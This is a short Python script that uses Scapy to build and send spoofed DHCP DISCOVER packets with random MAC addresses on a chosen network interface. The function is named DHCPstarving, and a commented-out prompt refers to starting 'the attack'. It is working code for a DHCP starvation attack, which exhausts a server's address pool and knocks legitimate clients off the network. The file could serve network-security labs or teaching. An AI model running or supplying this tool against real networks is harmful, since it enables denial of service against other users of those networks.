#!/usr/bin/python3
from scapy.all import *
import sys

is_windows = hasattr(sys, 'getwindowsversion')

if (is_windows) :
    import wmi

    c = wmi.WMI()
    qry = "select Name from Win32_NetworkAdapter where NetEnabled=True and NetConnectionStatus=2"

    listInterfaces = [o.Name for o in c.query(qry)]
else :
    import netifaces

    listInterfaces = netifaces.interfaces()

def getInterfaces() :
    return listInterfaces


def DHCPstarving(inter) :
    conf.checkIPaddr = False  # Disabling the IP address checking

    # Building the DISCOVER packet

    # Making an Ethernet packet
    DHCP_DISCOVER = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC(), type=0x0800) \
                / IP(src='0.0.0.0', dst='255.255.255.255') \
                / UDP(dport=67,sport=68) \
                / BOOTP(op=1, chaddr=RandMAC()) \
                / DHCP(options=[('message-type','discover'), ('end')])


    """ for i in range(len(listInterfaces)) :
        print (str(i+1)+') ', listInterfaces[i])    

    number = int(input("Select a number to start the attack :"))
    while (number > len(listInterfaces)) :
        number = int(input("Enter a valid number :")) """

    sendp(DHCP_DISCOVER, iface=inter, verbose=0)
